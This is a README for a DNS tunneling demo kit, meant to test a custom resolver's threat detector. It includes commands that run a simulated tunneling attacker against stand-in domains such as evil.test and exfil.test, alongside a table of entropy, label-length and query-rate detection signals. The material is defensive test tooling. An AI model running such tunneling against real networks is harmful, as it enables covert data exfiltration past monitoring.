# DNS Tunneling Demo Kit

Two scripts for demonstrating threat detection on your custom DNS resolver.

## Files

- **`tunnel_attacker.py`** — simulates DNS tunneling (iodine/dnscat2-style traffic)
- **`normal_traffic.py`** — sends realistic benign queries for contrast

Both use only the Python stdlib for UDP mode. DoH mode needs `requests` (`pip install requests`).

## Quick start

Point your laptop's DNS at the resolver in your network settings, or hit it directly:

```bash
# Baseline — should produce low threat scores
python normal_traffic.py --target <resolver-ip> --rate 2 --duration 60

# Attack — should light up the watchlist for evil.test
python tunnel_attacker.py --target <resolver-ip> --domain evil.test --rate 20 --duration 30
```

DoH against your EC2 endpoint:

```bash
python tunnel_attacker.py --target https://your-resolver.example/dns-query --doh \
    --domain exfil.test --rate 15 --duration 30
```

## What to watch on the monitoring page during the demo

When the attack script runs, your phase-1 detector should see:

| Signal                             | Normal traffic     | Tunnel traffic                           |
| ---------------------------------- | ------------------ | ---------------------------------------- |
| Shannon entropy of labels          | ~2.5–3.5 bits/char | ~4.5–5.0 bits/char (near max for base32) |
| Label length                       | mostly < 10 chars  | 25–40 chars per label                    |
| Queries/sec from one IP            | < 5                | 20+ sustained                            |
| Unique subdomains under one parent | a handful          | hundreds in seconds                      |

The tunneling-recognition layer should add `evil.test` (or whatever `--domain` you pick) to the watchlist with sample queries, timestamps, and entropy scores as evidence.

## Tuning the demo

- **`--rate 5`** for a slow-and-low attacker that's harder to spot — good for showing why the detector needs the entropy + length signals, not just rate
- **`--rate 50 --duration 10`** for a "screaming loud" demo that flags instantly
- Run **two terminals at once** (normal + tunnel) so the dashboard shows the detector picking the needle out of the haystack
- Vary `--domain` between runs to show that the watchlist tracks per-parent-domain, not globally

## Why this is a fair test of the detector

These scripts produce the actual fingerprints real tunneling tools produce — base32-encoded payloads, near-max-length labels, single-parent-domain concentration, and high query frequency. If your engine catches this, it'll catch iodine and dnscat2. If it misses something here, that's a real gap to fix before the demo.

## Safety notes

- `evil.test` and `exfil.test` are in the reserved `.test` TLD (RFC 2606) — they will never resolve on the public internet, so there's no risk of accidentally hammering a real domain.
- Only point these at resolvers you own. Sustained 20+ qps with novel labels is unfriendly to public resolvers and may trip their rate limiting.
